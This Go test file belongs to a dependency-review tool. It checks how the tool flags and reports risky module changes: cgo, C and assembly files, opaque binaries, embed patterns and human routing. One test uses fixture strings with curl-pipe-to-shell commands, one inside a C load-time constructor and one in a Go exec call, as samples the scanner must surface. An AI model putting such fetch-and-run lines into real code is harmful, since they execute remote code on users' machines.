package gomod

import (
	"fmt"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/sadbox/dep-review/internal/eco/ecoutil"
	"github.com/sadbox/dep-review/internal/eco/ecoutil/gittest"
	"github.com/sadbox/dep-review/internal/model"
)

// TestFlaggedFullText (security review H1): the full new text of every
// new or changed C or assembly file, cgo file and risky-import file is in
// the focused evidence, whatever the diff shows (a rename hid it).
func TestFlaggedFullText(t *testing.T) {
	csrc := "#include <stdlib.h>\n__attribute__((constructor)) static void evil(void) { system(\"curl x | sh\"); }\n"
	gosrc := "package p\n\nimport \"os/exec\"\n\nfunc Run() { exec.Command(\"sh\", \"-c\", \"curl evil | sh\").Run() }\n"
	cgosrc := "package p\n\n// int f(void);\nimport \"C\"\n\nfunc G() { C.f(); evilGo() }\n"
	asm := "TEXT ·f(SB),0,$0\n\tCALL runtime·evil(SB)\n\tRET\n"
	oldF := map[string]string{"testdata/notes.txt": csrc, "testdata/sample.txt": gosrc, "testdata/c.txt": cgosrc, "testdata/a.txt": asm, "p.go": "package p\n"}
	newF := map[string]string{"evil.c": csrc, "run.go": gosrc, "c.go": cgosrc, "x_amd64.s": asm, "p.go": "package p\n"}
	h := CheckTrees(writeTree(t, oldF), writeTree(t, newF))
	out := string(h.render("m"))
	for _, want := range []string{
		"    | __attribute__((constructor)) static void evil(void) { system(\"curl x | sh\"); }",
		"    | func Run() { exec.Command(\"sh\", \"-c\", \"curl evil | sh\").Run() }",
		"    | func G() { C.f(); evilGo() }",
		"    | \tCALL runtime·evil(SB)",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
}

// TestDistinctItemCap (security review H2): the cap counts distinct
// flagged items, not adds. One file with MaxFlagged new //go:generate
// lines is one item, so a later .syso still gets its context.
func TestDistinctItemCap(t *testing.T) {
	var gen strings.Builder
	gen.WriteString("package testdata\n\n")
	for i := range model.MaxFlagged {
		fmt.Fprintf(&gen, "//go:generate echo %d\n", i)
	}
	h := CheckTrees(nil, writeTree(t, map[string]string{
		"a/gen.go":    gen.String(),
		"z/evil.syso": "\x00\x01 no parser for this, evil payload string here",
		"z/z.go":      "package z\n",
	}))
	if ctx := h.ctx[codeBinary]["z/evil.syso"]; len(ctx) == 0 || ctx[0] == skipped {
		t.Errorf("2 flagged items, but the .syso context was skipped: %q", ctx)
	}
	if len(h.items(codeSkipped)) != 0 {
		t.Errorf("skipped items %q", h.items(codeSkipped))
	}
}

// TestSkippedGoesToAPerson (security review H2): wherever the "a person
// decides" text is written, a person-routed finding says so.
func TestSkippedGoesToAPerson(t *testing.T) {
	cur := map[string]string{"p.go": "package p\n"}
	for i := range model.MaxFlagged + 3 {
		cur[fmt.Sprintf("c%03d.c", i)] = fmt.Sprintf("int f%d(void) { return 0; }\n", i)
	}
	cur["zz.syso"] = "\x00\x01 no parser"
	h := CheckTrees(nil, writeTree(t, cur))
	var human bool
	for _, f := range h.findings("m") {
		if f.Code == codeSkipped && f.Route == model.RouteHuman {
			human = true
		}
	}
	if !human {
		t.Errorf("context was skipped without a person-routed finding")
	}
	for code, items := range h.ctx {
		for item, ctx := range items {
			if slices.Contains(ctx, skipped) && !slices.Contains(h.items(codeSkipped), code+" "+item) {
				t.Errorf("%s %s skipped without its finding", code, item)
			}
		}
	}
}

func TestBlobDecodeCharged(t *testing.T) {
	lit := `"` + strings.Repeat("QUJD", 300) + `"`
	out, _ := blobContext("b.go:1", lit, &ecoutil.Budget{Left: 10})
	if !strings.Contains(out, "budget for this module is spent") || strings.Contains(out, "it decodes as") {
		t.Errorf("blob decoded past the budget:\n%s", out)
	}
	b := &ecoutil.Budget{Left: 1 << 20}
	blobContext("b.go:1", lit, b)
	if b.Left > 1<<20-1200 {
		t.Errorf("decoding charged %d bytes for a 1200-byte literal", 1<<20-b.Left)
	}
}

// TestRefIndexMemory (security review M1): only mentions of the flagged
// binaries' names are kept, not every token of every line.
func TestRefIndexMemory(t *testing.T) {
	cur := map[string]string{"x.syso": "\x64\x86\x01\x00" + strings.Repeat("\x00", 40)}
	id := 0
	for f := range 8 {
		var b strings.Builder
		for b.Len() < 1<<20-600 {
			for range 64 {
				fmt.Fprintf(&b, "q/%05x ", id)
				id++
			}
			b.WriteString("\n")
		}
		cur[fmt.Sprintf("d/f%d.txt", f)] = b.String()
	}
	tr := writeTree(t, cur)
	runtime.GC()
	var m0, m1 runtime.MemStats
	runtime.ReadMemStats(&m0)
	ix := indexRefs(tr, map[string]bool{"x.syso": true})
	runtime.GC()
	runtime.ReadMemStats(&m1)
	if grew := int64(m1.HeapAlloc) - int64(m0.HeapAlloc); grew > 4<<20 {
		t.Errorf("the index holds %d MiB for 8 MiB of text", grew>>20)
	}
	runtime.KeepAlive(ix)
}

// TestEmbedPatternsBounded (security review M1): many binaries against
// huge //go:embed lines cost neither binaries x patterns nor unbounded
// patterns, and a capped directive makes "embedded" conservative.
func TestEmbedPatternsBounded(t *testing.T) {
	cur := map[string]string{}
	for i := range 190 {
		cur[fmt.Sprintf("d/e/f/g/b%03d.bin", i)] = fmt.Sprintf("\x00\x01bin-%d", i)
	}
	pat := strings.Repeat("x/y/z ", (1<<20-100)/6)
	for f := range 4 {
		cur[fmt.Sprintf("p%d.go", f)] = "package p\n//go:embed " + pat + "\nvar X string\n"
	}
	start := time.Now()
	h := CheckTrees(nil, writeTree(t, cur))
	if d := time.Since(start); d > 5*time.Second {
		t.Errorf("CheckTrees took %v", d)
	}
	out := string(h.render("m"))
	if !strings.Contains(out, "//go:embed patterns past the limit") || !strings.Contains(out, "treats this file as possibly embedded") {
		t.Errorf("capped patterns not reported:\n%.2000s", out)
	}
}

// TestLinkedUnrendered (security review L1): a binary that reaches the
// program and whose structure was not rendered goes to a person; one
// used only by tests does not.
func TestLinkedUnrendered(t *testing.T) {
	broken := "\x7fELF\x02\x01\x01 truncated header"
	cases := []struct {
		name  string
		files map[string]string
		want  bool
	}{
		{"syso", map[string]string{"x.syso": broken, "p.go": "package p\n"}, true},
		{"embedded by non-test code", map[string]string{"x.bin": broken, "p.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.bin\nvar b []byte\n"}, true},
		{"embedded by a test", map[string]string{"x.bin": broken, "p.go": "package p\n", "p_test.go": "package p\n\nimport _ \"embed\"\n\n//go:embed x.bin\nvar b []byte\n"}, false},
		{"unreferenced", map[string]string{"x.bin": broken, "p.go": "package p\n"}, false},
		// Informational (a): a .syso nothing can parse is linked and unread.
		{"syso with no parser for its type", map[string]string{"x.syso": "\x00\x01 opaque", "p.go": "package p\n"}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h := CheckTrees(nil, writeTree(t, tc.files))
			got := len(h.items(codeOpaque)) > 0
			if got != tc.want {
				t.Errorf("linked-unrendered = %v, want %v (%q)", got, tc.want, h.items(codeOpaque))
			}
			for _, f := range h.findings("m") {
				if f.Code == codeOpaque && f.Route != model.RouteHuman {
					t.Errorf("route %s", f.Route)
				}
			}
		})
	}
	// Budget spent: an ELF that would parse is not parsed.
	h := newReport()
	h.budget.Left = 0
	tr := writeTree(t, map[string]string{"x.syso": broken, "p.go": "package p\n"})
	h.binaries(nil, tr, []string{"x.syso"})
	if len(h.items(codeOpaque)) == 0 {
		t.Errorf("a linked binary whose parse budget was spent did not go to a person")
	}
}

// TestRefSearchNotes (security review L2): skipped files are named, "not
// found" says it covers only the files searched, test and non-test
// mentions have their own caps, and an unmatchable name says so.
func TestRefSearchNotes(t *testing.T) {
	cur := map[string]string{
		"logo.bin":   "\x00\x01logo",
		"big.txt":    strings.Repeat("x", maxRefFileLen+1),
		"other.bin":  "\x00\x02other",
		"p.go":       "package p\n\nconst name = \"logo.bin\"\n",
		"we,ird.bin": "\x00\x03weird",
	}
	for i := range maxRefs + 5 {
		cur[fmt.Sprintf("t%02d_test.go", i)] = "package p\n\nconst f = \"logo.bin\"\n"
	}
	h := CheckTrees(nil, writeTree(t, cur))
	logo := strings.Join(h.ctx[codeBinary]["logo.bin"], "")
	for _, want := range []string{
		"mentioned at p.go:3: const name = \"logo.bin\"",
		fmt.Sprintf("(first %d mentions of this kind shown)", maxRefs),
		"not searched: 1 files or lines larger than",
		"big.txt",
	} {
		if !strings.Contains(logo, want) {
			t.Errorf("logo.bin: missing %q in:\n%s", want, logo)
		}
	}
	if other := strings.Join(h.ctx[codeBinary]["other.bin"], ""); !strings.Contains(other, "no directive or mention found in the files searched") {
		t.Errorf("other.bin:\n%s", other)
	}
	weird := strings.Join(h.ctx[codeBinary][safeFile("we,ird.bin")], "")
	if !strings.Contains(weird, "mentions of it were not searched for") {
		t.Errorf("we,ird.bin:\n%s", weird)
	}
}

// TestGroupedBumpFlaggedOnce (security review L3): the same module change
// in two directories is flagged once, so the evidence's flagged list has
// no repeated item (which publish refuses).
func TestGroupedBumpFlaggedOnce(t *testing.T) {
	if testing.Short() {
		t.Skip("network")
	}
	base := gittest.ReadDir(t, filepath.Join("testdata", "towngear49", "base"))
	head := gittest.ReadDir(t, filepath.Join("testdata", "towngear49", "head"))
	for _, m := range []map[string][]byte{base, head} {
		m["sub/go.mod"] = []byte(strings.Replace(string(m["go.mod"]), "module ", "module sub.", 1))
		m["sub/go.sum"] = m["go.sum"]
	}
	dir, b, h := gittest.Repo(t, base, head)
	class := model.Classification{Repo: "test/grouped", PR: 1, BaseSHA: b, HeadSHA: h, Kind: model.KindDependabot, Ecosystem: model.GoModules,
		Declared: []model.Update{{Name: "golang.org/x/image", From: "0.47.0", To: "0.48.0"}}}
	ev := runFetch(t, dir, class)
	if len(ev.Flagged) == 0 {
		t.Fatalf("nothing flagged; the test needs a module with flagged items (findings %+v)", ev.Findings)
	}
	seen := map[model.FlaggedItem]bool{}
	for _, f := range ev.Flagged {
		if seen[f] {
			t.Fatalf("flagged twice: %+v", f)
		}
		seen[f] = true
	}
}

// TestFlaggedUpdateKey (security review L3): a module changing
// differently in two directories gives two keys, and the longest id the
// gate can build fits the verdict's limit.
func TestFlaggedUpdateKey(t *testing.T) {
	a := flaggedUpdate(model.Update{Name: "example.com/m", From: "v1.0.0", To: "v1.2.0"})
	b := flaggedUpdate(model.Update{Name: "example.com/m", From: "v1.1.0", To: "v1.2.0"})
	if a == b {
		t.Errorf("two different changes share the key %q", a)
	}
	long := strings.Repeat("a", maxDetailValue)
	longVer := "v" + strings.Repeat("1", maxDetailValue-1)
	ids := []string{
		flaggedUpdate(safeUpdate(model.Update{Name: "x.com/" + long[:maxDetailValue-6], From: longVer, To: longVer})),
		safeFile(long) + " (" + safeImport("x.com/"+long[:maxDetailValue-6]) + ")",
		codeImport + " " + safeFile(long) + " (" + safeImport("x.com/"+long[:maxDetailValue-6]) + ")",
		safeFile(long[:100]+"/"+long[:99]) + "/" + safeIdent(long),
	}
	for _, id := range ids {
		if strings.HasPrefix(id, "<") || len(id) > model.MaxItemField {
			t.Errorf("id of %d bytes (limit %d): %.80s", len(id), model.MaxItemField, id)
		}
	}
}
